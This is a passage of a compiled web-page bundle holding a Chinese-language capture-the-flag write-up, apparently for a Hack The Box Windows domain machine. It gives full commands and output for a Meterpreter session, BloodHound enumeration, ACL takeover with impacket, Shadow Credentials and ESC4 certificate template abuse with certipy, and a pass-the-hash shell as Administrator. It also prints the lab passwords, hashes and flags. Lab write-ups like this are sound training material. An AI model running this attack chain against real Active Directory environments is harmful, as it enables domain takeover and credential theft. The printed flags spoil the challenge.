reverse TCP handler on 0.0.0.0:9111\n[*] Sending stage (177734 bytes) to 10.10.11.51\n[*] Meterpreter session 2 opened (10.10.16.31:9111 -> 10.10.11.51:57721) at 2025-04-03 13:19:22 +0800\n\nmeterpreter > sysinfo\nComputer        : DC01\nOS              : Windows Server 2019 (10.0 Build 17763).\nArchitecture    : x64\nSystem Language : en_US\nMeterpreter     : x86/windows\nmeterpreter > getuid\nServer username: SEQUEL\\ryan\n"})}),"\n",(0,i.jsx)(n.h2,{id:"flag---user",children:"FLAG - USER"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-flag",metastring:'title="C:\\Users\\ryan\\Desktop\\user.txt"',children:"34cd418e2b0f83c1a5cd78518e05409e\n"})}),"\n",(0,i.jsx)(n.h2,{id:"bloodhound-\u679a\u4e3e",children:"BloodHound \u679a\u4e3e"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ bloodhound-python -c All -u ryan -p WqSZAF6CysDQbGb3 -ns 10.10.11.51 -d sequel.htb  --zip\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: sequel.htb\nINFO: Getting TGT for user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: dc01.sequel.htb\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: dc01.sequel.htb\nINFO: Found 10 users\nINFO: Found 59 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC01.sequel.htb\nINFO: Done in 00M 15S\nINFO: Compressing output into 20250403132606_bloodhound.zip\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u7136\u540e\u542f\u52a8 ",(0,i.jsx)(n.code,{children:"bloodhound"})," \u8fdb\u884c\u5206\u6790"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:t(37684).A+"",width:"2560",height:"1540"})}),"\n",(0,i.jsxs)(n.p,{children:["\u53c2\u8003 ",(0,i.jsx)(n.a,{href:"https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-acl-ace/#writedacl",children:"Active Directory - Access Controls ACL/ACE - Internal All The Things"})]}),"\n",(0,i.jsx)(n.p,{children:"\u5148\u5c06 ryan \u8bbe\u7f6e\u6210 owner"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ impacket-owneredit -new-owner ryan -target ca_svc -dc-ip 10.10.11.51 -action write sequel.htb/ryan:WqSZAF6CysDQbGb3\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Current owner information below\n[*] - SID: S-1-5-21-548670397-972687484-3496335370-512\n[*] - sAMAccountName: Domain Admins\n[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb\n[*] OwnerSid modified successfully!\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u53c2\u8003 ",(0,i.jsx)(n.a,{href:"https://exploit-notes.hdks.org/exploit/windows/active-directory/dacl-attack/#2.-read-dacl",children:"DACL (Discretionary Access Control List) Attack | Exploit Notes"})]}),"\n",(0,i.jsx)(n.p,{children:"\u800c\u540e\u5229\u7528 dacledit \u4fee\u6539 ACL"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ impacket-dacledit -action write -target ca_svc -principal ryan -rights FullControl -ace-type allowed -dc-ip 10.10.11.51 sequel.htb/ryan:WqSZAF6CysDQbGb3\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] DACL backed up to dacledit-20250403-141507.bak\n[*] DACL modified successfully!\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5373\u53ef\u5c1d\u8bd5\u83b7\u53d6 Shadow Credentials"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo timedatectl set-ntp 0\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo ntpdate sequel.htb\n2025-04-03 14:05:52.177708 (+0800) -1136.144118 +/- 0.037508 sequel.htb 10.10.11.51 s1 no-leap\nCLOCK: time stepped by -1136.144118\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.129.186.118 -target DC01.sequel.htb -account ca_svc\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Targeting user 'ca_svc'\n[*] Generating certificate\n[*] Certificate generated\n[*] Generating Key Credential\n[*] Key Credential generated with DeviceID '275f077c-1825-ac69-644d-02b8262dffff'\n[*] Adding Key Credential with device ID '275f077c-1825-ac69-644d-02b8262dffff' to the Key Credentials for 'ca_svc'\n[*] Successfully added Key Credential with device ID '275f077c-1825-ac69-644d-02b8262dffff' to the Key Credentials for 'ca_svc'\n[*] Authenticating as 'ca_svc' with the certificate\n[*] Using principal: ca_svc@sequel.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'ca_svc.ccache'\n[*] Trying to retrieve NT hash for 'ca_svc'\n[*] Restoring the old Key Credentials for 'ca_svc'\n[*] Successfully restored the old Key Credentials for 'ca_svc'\n[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5c06\u7968\u636e\u4fdd\u5b58\u81f3\u73af\u5883\u53d8\u91cf"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ export KRB5CCNAME=./ca_svc.ccache\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u800c\u540e\u5c1d\u8bd5\u679a\u4e3e\u6f0f\u6d1e"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ certipy-ad find -scheme ldap -k -debug -target DC01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[+] Domain retrieved from CCache: SEQUEL.HTB\n[+] Username retrieved from CCache: ca_svc\n[+] Trying to resolve 'DC01.sequel.htb' at '10.10.11.51'\n[+] Authenticating to LDAP server\n[+] Using Kerberos Cache: ./ca_svc.ccache\n[+] Using TGT from cache\n[+] Username retrieved from CCache: ca_svc\n[+] Getting TGS for 'host/DC01.sequel.htb'\n[+] Got TGS for 'host/DC01.sequel.htb'\n[+] Bound to ldap://10.10.11.51:389 - cleartext\n[+] Default path: DC=sequel,DC=htb\n[+] Configuration path: CN=Configuration,DC=sequel,DC=htb\n[+] Adding Domain Computers to list of current user's SIDs\n[+] List of current user's SIDs:\n     SEQUEL.HTB\\Domain Users (S-1-5-21-548670397-972687484-3496335370-513)\n     SEQUEL.HTB\\Cert Publishers (S-1-5-21-548670397-972687484-3496335370-517)\n     SEQUEL.HTB\\Authenticated Users (SEQUEL.HTB-S-1-5-11)\n     SEQUEL.HTB\\Certification Authority (S-1-5-21-548670397-972687484-3496335370-1607)\n     SEQUEL.HTB\\Domain Computers (S-1-5-21-548670397-972687484-3496335370-515)\n     SEQUEL.HTB\\Denied RODC Password Replication Group (S-1-5-21-548670397-972687484-3496335370-572)\n     SEQUEL.HTB\\Users (SEQUEL.HTB-S-1-5-32-545)\n     SEQUEL.HTB\\Everyone (SEQUEL.HTB-S-1-1-0)\n[*] Finding certificate templates\n[*] Found 34 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 12 enabled certificate templates\n[+] Resolved 'DC01.sequel.htb' from cache: 10.10.11.51\n[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA\n[+] Trying to get DCOM connection for: 10.10.11.51\n[+] Using Kerberos Cache: ./ca_svc.ccache\n[+] Using TGT from cache\n[+] Username retrieved from CCache: ca_svc\n[+] Getting TGS for 'host/DC01.sequel.htb'\n[+] Got TGS for 'host/DC01.sequel.htb'\n[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\n[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP\n[+] Using Kerberos Cache: ./ca_svc.ccache\n[+] Using TGT from cache\n[+] Username retrieved from CCache: ca_svc\n[+] Getting TGS for 'host/DC01.sequel.htb'\n[+] Got TGS for 'host/DC01.sequel.htb'\n[!] Failed to connect to remote registry. Service should be starting now. Trying again...\n[+] Connected to remote registry at 'DC01.sequel.htb' (10.10.11.51)\n[*] Got CA configuration for 'sequel-DC01-CA'\n[+] Resolved 'DC01.sequel.htb' from cache: 10.10.11.51\n[+] Connecting to 10.10.11.51:80\n[*] Enumeration output:\nCertificate Authorities\n  0\n    CA Name                             : sequel-DC01-CA\n    DNS Name                            : DC01.sequel.htb\n    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb\n    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3\n    Certificate Validity Start          : 2024-06-08 16:50:40+00:00\n    Certificate Validity End            : 2124-06-08 17:00:40+00:00\n    Web Enrollment                      : Disabled\n    User Specified SAN                  : Disabled\n    Request Disposition                 : Issue\n    Enforce Encryption for Requests     : Enabled\n    Permissions\n      Owner                             : SEQUEL.HTB\\Administrators\n      Access Rights\n        ManageCertificates              : SEQUEL.HTB\\Administrators\n                                          SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n        ManageCa                        : SEQUEL.HTB\\Administrators\n                                          SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n        Enroll                          : SEQUEL.HTB\\Authenticated Users\nCertificate Templates\n  0\n    Template Name                       : DunderMifflinAuthentication\n    Display Name                        : Dunder Mifflin Authentication\n    Certificate Authorities             : sequel-DC01-CA\n    Enabled                             : True\n    Client Authentication               : True\n    Enrollment Agent                    : False\n    Any Purpose                         : False\n    Enrollee Supplies Subject           : False\n    Certificate Name Flag               : SubjectRequireCommonName\n                                          SubjectAltRequireDns\n    Enrollment Flag                     : AutoEnrollment\n                                          PublishToDs\n    Private Key Flag                    : 16842752\n    Extended Key Usage                  : Client Authentication\n                                          Server Authentication\n    Requires Manager Approval           : False\n    Requires Key Archival               : False\n    Authorized Signatures Required      : 0\n    Validity Period                     : 1000 years\n    Renewal Period                      : 6 weeks\n    Minimum RSA Key Length              : 2048\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights               : SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n      Object Control Permissions\n        Owner                           : SEQUEL.HTB\\Enterprise Admins\n        Full Control Principals         : SEQUEL.HTB\\Cert Publishers\n        Write Owner Principals          : SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n                                          SEQUEL.HTB\\Administrator\n                                          SEQUEL.HTB\\Cert Publishers\n        Write Dacl Principals           : SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n                                          SEQUEL.HTB\\Administrator\n                                          SEQUEL.HTB\\Cert Publishers\n        Write Property Principals       : SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n                                          SEQUEL.HTB\\Administrator\n                                          SEQUEL.HTB\\Cert Publishers\n    [!] Vulnerabilities\n      ESC4                              : 'SEQUEL.HTB\\\\Cert Publishers' has dangerous permissions\n"})}),"\n",(0,i.jsx)(n.h2,{id:"windows-\u57df\u653b\u51fb",children:"Windows \u57df\u653b\u51fb"}),"\n",(0,i.jsxs)(n.p,{children:["\u53c2\u8003 ESC4 - Access Control Vulnerabilities ",(0,i.jsx)(n.a,{href:"https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/#esc4-access-control-vulnerabilities",children:"Active Directory - Certificate Services - Internal All The Things"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.10.11.51 -debug\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[+] Domain retrieved from CCache: SEQUEL.HTB\n[+] Username retrieved from CCache: ca_svc\n[+] Trying to resolve 'dc01.sequel.htb' at '10.10.11.51'\n[+] Authenticating to LDAP server\n[+] Using Kerberos Cache: ./ca_svc.ccache\n[+] Using TGT from cache\n[+] Username retrieved from CCache: ca_svc\n[+] Getting TGS for 'host/dc01.sequel.htb'\n[+] Got TGS for 'host/dc01.sequel.htb'\n[+] Bound to ldaps://10.10.11.51:636 - ssl\n[+] Default path: DC=sequel,DC=htb\n[+] Configuration path: CN=Configuration,DC=sequel,DC=htb\n[*] Updating certificate template 'DunderMifflinAuthentication'\n[+] MODIFY_DELETE:\n[+]     pKIExtendedKeyUsage: []\n[+]     msPKI-Certificate-Application-Policy: []\n[+] MODIFY_REPLACE:\n[+]     nTSecurityDescriptor: [b'\\x01\\x00\\x04\\x9c0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x02\\x00\\x1c\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x14\\x00\\xff\\x01\\x0f\\x00\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x05\\x0b\\x00\\x00\\x00\\x01\\x05\\x00\\x00\\x00\\x00\\x00\\x05\\x15\\x00\\x00\\x00\\xc8\\xa3\\x1f\\xdd\\xe9\\xba\\xb8\\x90,\\xaes\\xbb\\xf4\\x01\\x00\\x00']\n[+]     flags: [b'0']\n[+]     pKIDefaultKeySpec: [b'2']\n[+]     pKIKeyUsage: [b'\\x86\\x00']\n[+]     pKIMaxIssuingDepth: [b'-1']\n[+]     pKICriticalExtensions: [b'2.5.29.19', b'2.5.29.15']\n[+]     pKIExpirationPeriod: [b'\\x00@\\x1e\\xa4\\xe8e\\xfa\\xff']\n[+]     pKIDefaultCSPs: [b'1,Microsoft Enhanced Cryptographic Provider v1.0']\n[+]     msPKI-Enrollment-Flag: [b'0']\n[+]     msPKI-Private-Key-Flag: [b'16842768']\n[+]     msPKI-Certificate-Name-Flag: [b'1']\n[*] Successfully updated 'DunderMifflinAuthentication'\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ certipy-ad req -dns 10.10.11.51 -ns 10.10.11.51 -dns-tcp -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.129.186.118 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -debug\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n/usr/lib/python3/dist-packages/certipy/commands/req.py:459: SyntaxWarning: invalid escape sequence '\\('\n  \"(0x[a-zA-Z0-9]+) \\([-]?[0-9]+\",\n[+] Trying to resolve 'DC01.sequel.htb' at '10.10.11.51'\n[+] Generating RSA key\n[*] Requesting certificate via RPC\n[+] Trying to connect to endpoint: ncacn_np:10.10.11.51[\\pipe\\cert]\n[+] Connected to endpoint: ncacn_np:10.10.11.51[\\pipe\\cert]\n[*] Successfully requested certificate\n[*] Request ID is 30\n[*] Got certificate with multiple identifications\n    UPN: 'Administrator@sequel.htb'\n    DNS Host Name: '10.10.11.51'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator_10.pfx'\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5f97\u5230 ",(0,i.jsx)(n.code,{children:"administrator_10.pfx"})," \u4e4b\u540e\uff0c\u4f7f\u7528\u8bc1\u4e66\u83b7\u53d6 ",(0,i.jsx)(n.code,{children:"Administrator"})," \u7684\u54c8\u5e0c"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ certipy-ad auth -pfx ./administrator_10.pfx -dc-ip 10.10.11.51\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Found multiple identifications in certificate\n[*] Please select one:\n    [0] UPN: 'Administrator@sequel.htb'\n    [1] DNS Host Name: '10.10.11.51'\n> 0\n[*] Using principal: administrator@sequel.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5373\u53ef\u83b7\u53d6\u5230 ",(0,i.jsx)(n.code,{children:"Administrator"})," \u7528\u6237\u7684 shell"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff\n\nEvil-WinRM shell v3.7\n\nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami\nsequel\\administrator\n"})}),"\n",(0,i.jsx)(n.h2,{id:"flag---root",children:"FLAG - ROOT"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-flag",metastring:'title="C:\\Users\\Administrator\\Desktop\\root.txt"',children:"c12d6534cb19f1c647faf34edb9dca96\n"})})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}},18014:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20250443-094346-cc2a6d0b5898dd9632bc2a0e9c1f769b.png"},37684:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20250445-134538-916fe4f0dccb592d610bd6b9fa1b54fc.png"},28453:(e,n,t)=>{t.d(n,{R:()=>a,x:()=>o});var s=t(96540);const i={},r=s.createContext(i);function a(e){const n=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),s.createElement(r.Provider,{value:n},e.children)}}}]);